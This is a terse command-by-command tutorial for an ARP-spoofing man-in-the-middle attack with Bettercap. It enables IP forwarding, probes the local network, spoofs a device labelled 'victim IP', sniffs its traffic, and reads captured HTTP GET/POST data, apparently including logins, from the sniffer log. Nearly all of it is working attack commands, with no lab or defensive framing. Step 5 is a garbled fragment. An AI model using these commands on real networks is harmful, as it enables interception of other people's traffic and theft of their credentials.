
✅ 1. **Install Bettercap**
	~~~bash
sudo apt update
sudo apt install bettercap
~~~
### ✅ 2. **Enable IP Forwarding**

Temporarily:
~~~bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
~~~
Permanently:
~~~bash
sudo nano /etc/sysctl.conf
~~~

Uncomment or add this line:

~~~ini
net.ipv4.ip_forward=1
~~~
Then apply:
~~~bash
sudo sysctl -p
~~~
### ✅ 3. **Start Bettercap**

Find your network interface:
~~~bash
ip a
~~~
(Example: `wlan0`, `eth0`, etc.)

Run Bettercap:
~~~bash
sudo bettercap -iface wlan0  # replace wlan0 with your interface
~~~
✅ 4. **In the Bettercap Shell**
~~~bash
net.probe on
net.recon on
net.show                              # shows IPs of devices on network
set arp.spoof.targets 192.168.14.18   # victim IP
set arp.spoof.internal true
arp.spoof on
net.sniff on
~~~

5 is make login 

### ✅ 6. **View Captured HTTP Traffic**

From Ubuntu terminal:
~~~bash
tail -f ~/.bettercap.sniffer.log
~~~
You’ll see GET/POST data here (for HTTP, not HTTPS).


